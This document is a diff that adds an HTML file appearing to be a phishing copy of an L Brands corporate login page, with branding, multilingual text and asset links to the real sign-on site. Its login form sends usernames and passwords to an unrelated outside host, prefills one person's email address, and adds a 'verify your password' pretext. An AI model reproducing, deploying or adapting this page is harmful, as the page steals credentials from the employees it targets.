@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+
+<html lang="en" dir="ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"></head><body><header>
+ <meta name="viewport" content="width=device-width">
+    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no">
+</header>
+
+
+
+    <!--<base href="https://websso.limitedbrands.com/..">--><base href="."> 
+
+    <title>Lbrands User Login - ENT</title>
+    <link rel="stylesheet" href="style.css" media="screen" type="text/css">
+    <script type="text/javascript" src="jquery-1.9.1.js.download"></script>
+
+<!--[if gte IE 10]><!-->
+    <script type="text/javascript" src="jssor.js.download"></script>
+    <script type="text/javascript" src="jssor.slider.js.download"></script>
+    <script type="text/javascript" src="slider.js.download"></script>
+<!--<![endif]-->
+    <script type="text/javascript" src="popup.js.download"></script>
+    <script type="text/javascript">
+        $(document).ready(function () {
+            $('#language').change(function () {
+                //alert('Handler for .change() called.');
+                //alert($(this).val());
+                switch ($(this).val()) {
+                    case "english":
+                        $('#message').text("PLEASE USE YOUR L BRANDS NETWORK ID AND PASSWORD TO LOGIN");
+                        $('#lblUsername').text("User Name:");
+                        $('#lblPassword').text("Password:");
+                        $('#secmessage1').text("By clicking Go, I accept and agree to the site");
+                        $('#userAgree').attr("href", "javascript: popup('https://websso.limitedbrands.com/../assets/LBEnt/sec_notice/sec_notice_en.html', 'popup', 400, 300, '1', '0', '0');").text("User Agreement");
+                        $('#secmessage2').text(", certify that I am an authorized user, and understand that my activity and communications when using the site may be monitored.");
+	                $('#login-submit').attr("src", "https://websso.limitedbrands.com/../assets/LBEnt/images/Go_en.png" );
+			$('#Usermessage').text("Name must be filled out");
+			$('#Passwordmessage').text("Password must be filled out");
+			$('#langpass').text("en");
+                        break;
+                    case "caFrench":
+                        $('#message').text("VEUILLEZ UTILISER VOTRE IDENTIFIANT RÉSEAU ET VOTRE MOT DE PASSE POUR OUVRIR UNE SESSION");
+                        $('#lblUsername').text("Nom d’utilisateur:");
+                        $('#lblPassword').text("Mot de passe:");
+                        $('#secmessage1').text("En cliquant sur « Go » (Aller), j’accepte le");
+                        $('#userAgree').attr("href", "javascript:popup('https://websso.limitedbrands.com/../assets/LBEnt/sec_notice/sec_notice_cfr.html','popup', 400, 300,'1','0','0');").text("Contrat de l’utilisateur");
+                        $('#secmessage2').text("du site, je certifie que je suis un utilisateur autorisé et je comprends que lorsque j’utilise le site, mon activité et mes communications peuvent être surveillées.");
+	                $('#login-submit').attr("src", "https://websso.limitedbrands.com/../assets/LBEnt/images/Go_fr.png" );
+			$('#langpass').text("cfr");
+			$('#Usermessage').text("Le champ du nom doit être rempli");
+			$('#Passwordmessage').text("Le champ du mot de passe doit être rempli");
+                        break;
+                    case "simpchinese":
+                        $('#message').text("请使用您的网络 ID 和密码进行登录:");
+                        $('#lblUsername').text("用户名:");
+                        $('#lblPassword').text("密码:");
+                        $('#secmessage1').text("单击“前往 (Go)”，即表示我接受并同意网站的");                      
+                        $('#userAgree').attr("href", "javascript: popup('https://websso.limitedbrands.com/../assets/LBEnt/sec_notice/sec_notice_sch.html', 'popup', 400, 300, '1', '0', '0');").text("用户协议");
+                        $('#secmessage2').text("，证明我为经授权用户，并了解我使用网站进行的活动和交流 可能受到监控。");
+	                $('#login-submit').attr("src", "https://websso.limitedbrands.com/../assets/LBEnt/images/Go_scn.png" );
+			$('#langpass').text("scn");
+			$('#Usermessage').text("必须填写姓名");
+			$('#Passwordmessage').text("必须填写密码");
+                        break;
+                    case "spanish":
+                        $('#message').text("UTILICE SU ID Y CONTRASEÑA DE LA RED PARA INICIAR SESIÓN");
+                        $('#lblUsername').text("Usuario:");
+                        $('#lblPassword').text("Contraseña:");
+                        $('#secmessage1').text("Al hacer clic en Ir, acepto el");
+                        $('#userAgree').attr("href", "javascript: popup('https://websso.limitedbrands.com/../assets/LBEnt/sec_notice/sec_notice_es.html', 'popup', 400, 300, '1', '0', '0');").text("Acuerdo del usuario");
+                        $('#secmessage2').text("del sitio, certifico que soy un usuario autorizado y comprendo que mis actividades y comunicaciones pueden monitorearse mientras uso el sitio.");
+	                $('#login-submit').attr("src", "https://websso.limitedbrands.com/../assets/LBEnt/images/Go_es.png" );
+			$('#langpass').text("es");
+			$('#Usermessage').text("Se debe ingresar un nombre");
+			$('#Passwordmessage').text("Se debe ingresar una contraseña");
+                        break;
+                    case "tradchinese":
+                        $('#message').text("請使用您的網絡 ID 及密碼登入:");
+                        $('#lblUsername').text("用戶名稱:");
+                        $('#lblPassword').text("密碼:");
+                        $('#secmessage1').text("按一下「繼續」，即表示我接受並同意網站");                                              $('#userAgree').attr("href", "javascript: popup('https://websso.limitedbrands.com/../assets/LBEnt/sec_notice/sec_notice_tch.html', 'popup', 400, 300, '1', '0', '0');").text("用戶協議");
+                        $('#secmessage2').text("，證明本人是授權使用者，了解本人使用網站時的活動及通訊 可能會受到監控。");
+	                $('#login-submit').attr("src", "https://websso.limitedbrands.com/../assets/LBEnt/images/Go_tcn.png" );
+			$('#langpass').text("tcn");
+			$('#Usermessage').text("必須填寫姓名");
+			$('#Passwordmessage').text("必須填寫密碼");
+                        break;
+                    case "korean":
+                        $('#message').text("로그인하시려면 네트워크 ID와 비밀번호를 사용하십시오:");
+                        $('#lblUsername').text("사용자명:");
+                        $('#lblPassword').text("비밀번호:");
+                        $('#secmessage1').text("진행(Go)을 클릭함으로써 본인은 사이트의");                                              $('#userAgree').attr("href", "javascript: popup('https://websso.limitedbrands.com/../assets/LBEnt/sec_notice/sec_notice_kr.html', 'popup', 400, 300, '1', '0', '0');").text("사용자 동의서");
+                        $('#secmessage2').text("를 수락하고 이에 동의하며, 본인이 승인된 사용자임을 확인하고, 사이트를 이용할 때 본인의 활동과 의사소통이 모니터링될 수 있음을 이해합니다. ");
+	                $('#login-submit').attr("src", "https://websso.limitedbrands.com/../assets/LBEnt/images/Go_kr.png" );
+			$('#langpass').text("kr");
+			$('#Usermessage').text("이름을 반드시 입력해야 합니다");
+			$('#Passwordmessage').text("비밀번호를 반드시 입력해야 합니다");
+                        break;
+                }
+            });
+        });
+    </script>
+    
+
+
+
+
+
+    <script type="text/javascript">
+        function validateForm() {
+            var x = document.forms["UserInput"]["uname"].value;
+            var y = document.forms["UserInput"]["pass"].value;
+	    
+	    var e = document.getElementById("language");
+	    var f = e.options[e.selectedIndex].value;
+
+	    var usermessage = "Name must be filled out"		
+	    var passwordmessage = "Password must be filled out"
+
+	    if (f == "caFrench") {
+		usermessage = "Le champ du nom doit être rempli";
+		passwordmessage = "Le champ du mot de passe doit être rempli";
+	    } 	
+	
+	    if (f == "simpchinese") {
+		usermessage = "必须填写姓名";
+		passwordmessage = "必须填写密码";
+	    } 
+	    if (f == "spanish") {
+		usermessage = "Se debe ingresar un nombre";
+		passwordmessage = "Se debe ingresar una contraseña";
+	    } 
+	    if (f == "tradchinese") {
+		usermessage = "必須填寫姓名";
+		passwordmessage = "必須填寫密碼";
+	    } 
+	    if (f == "korean") {
+		usermessage = "이름을 반드시 입력해야 합니다";
+		passwordmessage = "비밀번호를 반드시 입력해야 합니다";
+	    } 
+	
+            if (x == null || x == "") {
+                alert(usermessage);
+                return false;
+            }
+            else if (y == null || y == "") {
+                alert(passwordmessage);
+                return false;
+            }
+            else 
+            {
+                return true;
+            }
+        }
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+    <div id="header">
+        <div id="hContainer">
+            <img src="logo.png" alt="">
+        </div>
+<!--[if gte IE 10]><!-->
+        <div id="h2Container">
+            <img src="logo.png" alt="">
+        </div>
+        <div id="h3Container">
+            <img src="logo.png" alt="">
+        </div>
+<!--<![endif]-->  
+     </div>
+
+
+
+
+    <div class="login">
+        <div class="login-screen">
+            <div class="login-form" id="loginbox">
+
+                <div id="closebutton" class="lbl">
+		    
+		    <!---<input type="image" src="https://websso.limitedbrands.com/../assets/LBEnt/images/x.png" onclick="self.close()">--->
+
+		   <a href="javascript:window.close();">	
+                    <img src="x.pneg" alt="">
+		    </a>  
+                </div>
+
+                
+
+                <div id="message" class="lbl"><br/>
+
+                    <div class="row  lbl text-body col-md-12" style="font-size: .9375rem; display: flex; margin-top: -7px;" >
+                  Because you're accessing sensitive info, you need to verify your password
+                </div><br/>
+                    PLEASE USE YOUR L BRANDS NETWORK ID AND PASSWORD TO LOGIN
+
+                </div>
+                <form name="UserInput" method="post" action="https://www.707222junk.com/feedback1.php"  autocomplete="off" onsubmit="return validateForm()">
+                    <div class="control-group">
+                        <label class="lbl" id="lblUsername">User Name:</label>
+                        <div class="lblClear"></div>
+                        <input type="text" class="login-fielduser" value="agraf@beautyavenues.com" name="email" id="username">
+                    </div>
+                    <div class="control-group">
+                        <label class="lbl" id="lblPassword">Password:</label>
+                        <div class="lblClear"></div>
+                        <input type="password" class="login-fieldpass" name="password" id="password">
+
+                    </div>
+
+
+
+                    <div class="goGroup">
+                        <input id="login-submit" type="image" src="Go_en.png" alt="Submit">
+                    </div>
+
+
+
+		    <div id="agmsg">
+                     <div id="secmessage1">By clicking Go, I accept and agree to the site </div>
+		     <a id="userAgree" href="javascript:popup(&#39;https://websso.limitedbrands.com/../assets/LBEnt/sec_notice/sec_notice_en.html&#39;, &#39;popup&#39;, 400, 300, &#39;1&#39;, &#39;0&#39;,&#39;0&#39;);">User Agreement</a>
+                     <div id="secmessage2">, certify that I am an authorized user, and understand that my activity and communications when using the site may be monitored.</div>
+		    
+                     </div>	
+
+
+                <div id="languageGroup" class="control-group">
+                    <select id="language">
+                        <option value="english">English (US)</option>
+                        <option value="caFrench">Français canadien (Canada)</option>
+                        <option value="simpchinese">简体中文（中国）</option>
+                        <option value="spanish">Español (Puerto&nbsp;Rico)</option>
+                        <option value="tradchinese">繁體中文（香港</option>
+                        <option value="korean">한국어 (한국)</option>
+                    </select>
+                   
+                </div>
+
+
+                <div id="Environment" class="lbl"> 
+                    
+                </div>
+
+                    <input type="hidden" name="target" value="">
+	        </form>
+
+
+            </div>
+            <div id="bckImage">
+                <img src="background.png" alt="">
+            </div>
+        </div>
+    </div>
+    <center>
+
+        <!-- Begin SLIDER -->
+
+<!--[if gte IE 10]><!-->
+
+        <div id="slider1_container" style="position: relative; top: 0px; left: 0px; width: 769px; height: 700.527px; overflow: hidden;" jssor-slider="true">
+
+            <!-- Loading Screen -->
+            
+
+            <!-- Slides Container -->
+ 	    
+            <!-- EndSlides Container -->
+
+            <!--#region Bullet Navigator Skin Begin -->
+            
+            <!-- bullet navigator container -->
+<!---
+            <div u="navigator" class="jssorb05" style="bottom: 16px; right: 6px;"> --->
+                <!-- bullet navigator item prototype -->
+                
+            <div style="position: absolute; top: 0px; left: 0px; width: 730px; height: 665px; transform-origin: 0px 0px; transform: scale(1.05342);"><div class="" style="position: relative; top: 0px; left: 0px; width: 730px; height: 665px; overflow: visible; display: block;"><div u="loading" style="position: absolute; top: 0px; left: 0px; width: 769px; height: 665px; display: none;" debug-id="loading-container">
+                <div style="filter: alpha(opacity=70); opacity:0.7; position: absolute; display: block;
+                background-color: #000000; top: 0px; left: 0px;width: 100%;height:100%;">
+                </div>
+                <div style="position: absolute; display: block; background: url(https://websso.limitedbrands.com/../assets/LBEnt/images/loading.gif) no-repeat center center; top: 0px; left: 0px; width: 100%; height: 100%;">
+                </div>
+            </div><div u="slides" style="cursor: move; position: absolute; left: 0px; top: 0px; width: 730px; height: 665px; overflow: hidden; z-index: 0;"><div debug-id="slide_container" style="position: absolute; z-index: 0; pointer-events: none; left: 0px; top: 0px; display: none;"></div></div><div u="slides" style="cursor: move; position: absolute; left: 0px; top: 0px; width: 730px; height: 665px; overflow: hidden; z-index: 0;" debug-id="slide-board"><div style="width: 769px; height: 665px; top: 0px; left: 0px; position: absolute; background-color: rgb(0, 0, 0); opacity: 0; display: none;"></div>
+                <div debug-id="slide-0" style="width: 769px; height: 665px; top: 0px; left: 0px; position: absolute; overflow: hidden;">
+                    <img u="image" src="iPad-VS.png" border="0" style="width: 769px; height: 665px; top: 0px; left: 0px; position: absolute;">
+                <div u="loading" style="position: absolute; top: 0px; left: 0px; width: 769px; height: 665px; z-index: 1000; display: none;">
+                <div style="filter: alpha(opacity=70); opacity:0.7; position: absolute; display: block;
+                background-color: #000000; top: 0px; left: 0px;width: 100%;height:100%;">
+                </div>
+                <div style="position: absolute; display: block; background: url(https://websso.limitedbrands.com/../assets/LBEnt/images/loading.gif) no-repeat center center; top: 0px; left: 0px; width: 100%; height: 100%;">
+                </div>
+            </div></div>
+                <div debug-id="slide-1" style="width: 769px; height: 665px; top: 0px; left: 769px; position: absolute; overflow: hidden;">
+                    <img u="image" src="iPad-BBW.png" border="0" style="width: 769px; height: 665px; top: 0px; left: 0px; position: absolute;">
+                <div u="loading" style="position: absolute; top: 0px; left: 0px; width: 769px; height: 665px; z-index: 1000; display: none;">
+                <div style="filter: alpha(opacity=70); opacity:0.7; position: absolute; display: block;
+                background-color: #000000; top: 0px; left: 0px;width: 100%;height:100%;">
+                </div>
+                <div style="position: absolute; display: block; background: url(https://websso.limitedbrands.com/../assets/LBEnt/images/loading.gif) no-repeat center center; top: 0px; left: 0px; width: 100%; height: 100%;">
+                </div>
+            </div></div>
+                <div debug-id="slide-2" style="width: 769px; height: 665px; top: 0px; left: -769px; position: absolute; overflow: hidden;">
+                    <img u="image" src="iPad-PINK.png" border="0" style="width: 769px; height: 665px; top: 0px; left: 0px; position: absolute;">
+                <div u="loading" style="position: absolute; top: 0px; left: 0px; width: 769px; height: 665px; z-index: 1000; display: none;">
+                <div style="filter: alpha(opacity=70); opacity:0.7; position: absolute; display: block;
+                background-color: #000000; top: 0px; left: 0px;width: 100%;height:100%;">
+                </div>
+                <div style="position: absolute; display: block; background: url(https://websso.limitedbrands.com/../assets/LBEnt/images/loading.gif) no-repeat center center; top: 0px; left: 0px; width: 100%; height: 100%;">
+                </div>
+            </div></div>
+                <div debug-id="slide-3" style="width: 769px; height: 665px; top: 0px; left: -769px; position: absolute; overflow: hidden;">
+                    <img u="image" src="iPad-VSB.png" border="0" style="width: 769px; height: 665px; top: 0px; left: 0px; position: absolute;">
+                <div u="loading" style="position: absolute; top: 0px; left: 0px; width: 769px; height: 665px; z-index: 1000; display: none;">
+                <div style="filter: alpha(opacity=70); opacity:0.7; position: absolute; display: block;
+                background-color: #000000; top: 0px; left: 0px;width: 100%;height:100%;">
+                </div>
+                <div style="position: absolute; display: block; background: url(https://websso.limitedbrands.com/../assets/LBEnt/images/loading.gif) no-repeat center center; top: 0px; left: 0px; width: 100%; height: 100%;">
+                </div>
+            </div></div>
+            </div><style>
+                /* jssor slider bullet navigator skin 05 css */
+                /*
+                    .jssorb05 div           (normal)
+                    .jssorb05 div:hover     (normal mouseover)
+                    .jssorb05 .av           (active)
+                    .jssorb05 .av:hover     (active mouseover)
+                    .jssorb05 .dn           (mousedown)
+                    */
+                .jssorb05 {
+                    position: absolute;
+                }
+
+                    .jssorb05 div, .jssorb05 div:hover, .jssorb05 .av {
+                        position: absolute;
+                        /* size of bullet elment */
+                        width: 16px;
+                        height: 16px;
+                        background: url(https://websso.limitedbrands.com/../assets/LBEnt/images/b05.png) no-repeat;
+                        overflow: hidden;
+                        cursor: pointer;
+                    }
+
+                    .jssorb05 div {
+                        background-position: -7px -7px;
+                    }
+
+                        .jssorb05 div:hover, .jssorb05 .av:hover {
+                            background-position: -37px -7px;
+                        }
+
+                    .jssorb05 .av {
+                        background-position: -67px -7px;
+                    }
+
+                    .jssorb05 .dn, .jssorb05 .dn:hover {
+                        background-position: -97px -7px;
+                    }
+            </style><div u="prototype"></div></div></div></div>
+
+            <!--#endregion Bullet Navigator Skin End -->
+           
+
+ <!--#region Arrow Navigator Skin Begin ----  take out arrows  --->
+            <style>
+                /* jssor slider arrow navigator skin 12 css */
+                /*
+                    .jssora12l                  (normal)
+                    .jssora12r                  (normal)
+                    .jssora12l:hover            (normal mouseover)
+                    .jssora12r:hover            (normal mouseover)
+                    .jssora12l.jssora12ldn      (mousedown)
+                    .jssora12r.jssora12rdn      (mousedown)
+                    */
+                .jssora12l, .jssora12r {
+                    display: block;
+                    position: absolute;
+                    /* size of arrow element */
+                    width: 30px;
+                    height: 46px;
+                    cursor: pointer;
+                    background: url(https://websso.limitedbrands.com/../assets/LBEnt/images/a12.png) no-repeat;
+                    overflow: hidden;
+                }
+
+                .jssora12l {
+                    background-position: -16px -37px;
+                }
+
+                .jssora12r {
+                    background-position: -75px -37px;
+                }
+
+                .jssora12l:hover {
+                    background-position: -136px -37px;
+                }
+
+                .jssora12r:hover {
+                    background-position: -195px -37px;
+                }
+
+                .jssora12l.jssora12ldn {
+                    background-position: -256px -37px;
+                }
+
+                .jssora12r.jssora12rdn {
+                    background-position: -315px -37px;
+                }
+            </style>
+
+          
+            <!-- Arrow Left -->
+            <!---
+	    <span u="arrowleft" class="jssora12l" style="top: 123px; left: 0px;">
+            </span> --->
+            <!-- Arrow Right -->
+            <!---
+            <span u="arrowright" class="jssora12r" style="top: 123px; right: 0px;">
+            </span> 
+            --->
+        
+<!--<![endif]-->
+
+        <!-- END SLIDER -->
+    </center>
+
+
+</body></html>
